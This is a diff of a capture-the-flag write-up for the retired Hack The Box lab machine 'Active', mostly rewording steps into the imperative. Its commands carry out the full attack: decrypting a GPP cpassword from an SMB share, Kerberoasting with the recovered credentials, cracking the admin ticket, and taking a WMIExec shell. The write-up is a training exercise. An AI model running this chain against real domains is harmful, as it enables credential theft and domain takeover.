@@ -16,20 +16,20 @@ Active is a retired Windows box that focuses on Active Directory enumeration, cr
 
 ## Recon
 ### Nmap — Port Discovery
-I began with a full TCP sweep to identify all open ports on the target.
+Begin with a full TCP sweep to identify all open ports on the target.
 
 `sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`
 
 ![](/assets/img/htb/Active/active01.png)
 
-I parsed the results to store all open ports in a variable for follow-up scanning.
+Parse the results to store all open ports in a variable for follow-up scanning.
 
 `ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`
 
 ---
 
 ### Nmap — Service Enumeration
-I then ran a targeted service and script scan against only the discovered open ports.
+Run a targeted service and script scan against only the discovered open ports.
 
 `sudo nmap -sC -sV -p $ports 10.129.17.166 -oN scans/services.txt -Pn`
 
@@ -38,7 +38,7 @@ I then ran a targeted service and script scan against only the discovered open p
 ---
 
 ### Host Resolution
-I added the target hostname to /etc/hosts.
+Add the target hostname to /etc/hosts.
 
 `echo '10.129.18.74 active.htb' | sudo tee -a /etc/hosts`
 
@@ -52,7 +52,7 @@ AD is confirmed. Enumerate SMB with NetExec for any open shares.
 
 ![](/assets/img/htb/Active/active03.png)
 
-SMB shows a readable share called Replication. I use `smbclient` to pull the share.
+SMB shows a readable share called Replication. use `smbclient` to pull the share.
 
 `mkdir -p Replication && cd Replication`
 
@@ -73,7 +73,8 @@ Inside is a Groups.xml file — a classic GPP artifact known to store recoverabl
 
 ![](/assets/img/htb/Active/active065.png)
 
-Decrypt the embedded cpassword to recover the service account password
+Discovered username `SVC_TGS`.
+Decrypt the embedded cpassword to recover the service account password.
 
 `gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
 
@@ -89,7 +90,7 @@ Validate access with the recovered account:
 
 ## Privilege Escalation
 ### Kerberoasting
-Since I now had valid credentials, I performed a Kerberoasting attack to pull crackable service tickets for any high-privilege accounts.
+With valid credentials, perform a Kerberoasting attack to pull crackable service tickets for any high-privilege accounts.
 
 `python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.18.74 -request -outputfile tgs_hashes.txt`
 
@@ -103,7 +104,7 @@ Crack the Kerberos ticket with `hashcat`.
 
 The ticket cracked to domain admin credentials, which I verified over SMB.
 
-`nxc smb 10.129.18.74 -u 'active.htb\Administrator' -p 'Ticketmaster1968' --shares
+`nxc smb 10.129.18.74 -u 'active.htb\Administrator' -p 'Ticketmaster1968' --shares`
 
 ![](/assets/img/htb/Active/active10.png)
 
@@ -113,7 +114,7 @@ With admin credentials confirmed, I used WMIExec to get an interactive shell.
 
 ![](/assets/img/htb/Active/active11.png)
 
-From here, you can get the flag.
+From here, you can get the flags.
 
 `type C:\Users\Administrator\Desktop\root.txt`
 
